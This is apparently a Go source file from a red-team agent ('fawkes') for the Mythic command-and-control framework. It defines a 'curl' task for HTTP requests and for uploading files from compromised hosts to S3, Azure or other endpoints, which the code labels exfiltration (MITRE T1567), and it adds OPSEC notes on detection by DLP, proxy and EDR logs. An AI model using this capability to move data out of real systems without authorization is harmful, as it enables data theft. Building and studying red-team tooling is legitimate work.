package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "curl",
		Description:         "Make HTTP/HTTPS requests. Upload files for exfiltration to S3 presigned URLs, Azure SAS, or generic endpoints (T1567).",
		HelpString:          "curl -url <URL> [-method GET|PUT|POST] [-file /path/to/upload] [-upload raw|multipart] [-headers '{\"key\":\"val\"}'] [-body <data>]",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1106", "T1567", "T1567.002"}, // Native API + Exfiltration Over Web Service
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "url",
				CLIName:          "url",
				ModalDisplayName: "URL",
				Description:      "Target URL (http:// or https://)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "method",
				CLIName:          "method",
				ModalDisplayName: "HTTP Method",
				Description:      "HTTP method (default: GET)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"},
				DefaultValue:     "GET",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "body",
				CLIName:          "body",
				ModalDisplayName: "Request Body",
				Description:      "Request body for POST/PUT/PATCH",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "headers",
				CLIName:          "headers",
				ModalDisplayName: "Custom Headers (JSON)",
				Description:      "Custom headers as JSON object: {\"Key\": \"Value\"}",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "file",
				CLIName:          "file",
				ModalDisplayName: "File to Upload",
				Description:      "File path to upload as request body (for exfiltration to S3/Azure/HTTP endpoints). Method defaults to PUT when file is set.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "upload",
				CLIName:          "upload",
				ModalDisplayName: "Upload Mode",
				Description:      "Upload mode: raw (file as body, for PUT/S3 presigned) or multipart (multipart/form-data, for POST endpoints)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"raw", "multipart"},
				DefaultValue:     "raw",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "output",
				CLIName:          "output",
				ModalDisplayName: "Output Mode",
				Description:      "Output format: full (headers+body), body (body only), headers (headers only)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"full", "body", "headers"},
				DefaultValue:     "full",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Request timeout in seconds (default: 30)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "max_size",
				CLIName:          "max_size",
				ModalDisplayName: "Max Response Size (bytes)",
				Description:      "Maximum response body size in bytes (default: 1MB)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     1048576,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			url, _ := taskData.Args.GetStringArg("url")
			file, _ := taskData.Args.GetStringArg("file")
			msg := fmt.Sprintf("OPSEC WARNING: Outbound HTTP request from agent to %s. Generates network traffic that may be logged by proxy/firewall.", url)
			if file != "" {
				msg = fmt.Sprintf("OPSEC WARNING: File upload (T1567 — Exfiltration Over Web Service) to %s. Uploading %s via HTTP. Generates significant egress traffic. DLP systems monitor large HTTP PUT/POST payloads to external URLs.", url, file)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: HTTP request completed. Outbound connection logged in network monitoring, proxy logs, and EDR. DNS resolution for the target domain cached locally. TLS certificate validation and SNI reveal the target. Consider using the C2 channel for data transfer instead of direct HTTP when possible.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			url, _ := taskData.Args.GetStringArg("url")
			method, _ := taskData.Args.GetStringArg("method")
			file, _ := taskData.Args.GetStringArg("file")
			if method == "" {
				if file != "" {
					method = "PUT"
				} else {
					method = "GET"
				}
			}

			displayMsg := fmt.Sprintf("%s %s", method, url)
			if file != "" {
				displayMsg += fmt.Sprintf(" (upload: %s)", file)
			}
			response.DisplayParams = &displayMsg

			if file != "" {
				createArtifact(taskData.Task.ID, "File Read",
					fmt.Sprintf("HTTP %s upload %s → %s", method, file, url))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[EXFILTRATION] curl: uploading %s to %s via HTTP %s", file, url, method), true)
			} else {
				createArtifact(taskData.Task.ID, "API Call",
					fmt.Sprintf("HTTP %s request to %s", method, url))
			}

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			url, _ := processResponse.TaskData.Args.GetStringArg("url")
			method, _ := processResponse.TaskData.Args.GetStringArg("method")
			if method == "" {
				method = "GET"
			}
			createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
				fmt.Sprintf("HTTP %s %s (%d bytes response)", method, url, len(responseText)))
			return response
		},
	})
}
